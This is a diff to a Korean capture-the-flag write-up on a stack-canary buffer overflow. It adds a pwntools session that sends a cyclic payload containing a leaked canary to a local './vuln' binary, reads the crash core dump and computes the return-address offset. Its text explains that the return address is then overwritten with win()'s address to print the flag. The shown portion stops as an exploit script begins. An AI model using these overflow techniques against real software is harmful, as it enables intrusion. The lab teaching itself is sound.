@@ -5,6 +5,7 @@
 - [Exploitation](#exploitation)
   * [1. 오프셋 확인하기](#1-오프셋-확인하기)
   * [2. 무차별 대입 공격으로 카나리 유출하기](#2-무차별-대입-공격으로-카나리-유출하기)
+  * [3. RET 덮어쓰기]()
 - [FLAG](#flag)
 <br />
 
@@ -187,6 +188,27 @@ $ python3 test2.py
 <br />
 
 ## 3. RET 덮어쓰기
+```bash
+$ python3 -q
+>>> from pwn import *
+>>> p = process("./vuln")
+[+] Starting local process './vuln': pid 10788
+>>> pay = cyclic(64) + b"DFGH" + cyclic(128)
+>>> p.send(b"100\n")
+>>> p.send(pay)
+>>> p.wait()
+[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 10788)
+>>> core = Corefile("./core.10788")
+[+] Parsing corefile...: Done
+[*] '/home/kali/pico/core.10788'
+    Arch:      i386-32-little
+    EIP:       0x61616165
+    ESP:       0xff90ca60
+    Exe:       '/home/kali/pico/vuln' (0x8048000)
+    Fault:     0x61616165
+>>> cyclic_find(0x61616165)
+16
+```
 카나리와 `RET`의 오프셋은 `0x10` 입니다. 프로세스를 다시 연결하고, 각 오프셋에 맞게 값을 넣어줍니다. 이후 `RET`을 `win()`의 주소로 덮으면 FLAG가 출력될 것입니다. 
 ```python
 from pwn import *
